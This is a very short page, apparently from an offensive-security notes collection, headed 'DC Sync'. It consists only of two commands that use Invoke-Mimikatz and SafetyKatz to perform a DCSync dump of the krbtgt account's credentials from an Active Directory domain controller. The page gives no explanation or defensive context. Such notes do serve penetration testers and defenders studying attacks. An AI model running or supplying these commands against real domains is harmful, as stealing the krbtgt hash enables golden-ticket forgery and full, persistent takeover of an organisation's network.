# DC Sync



{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' 

SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
{% endcode %}
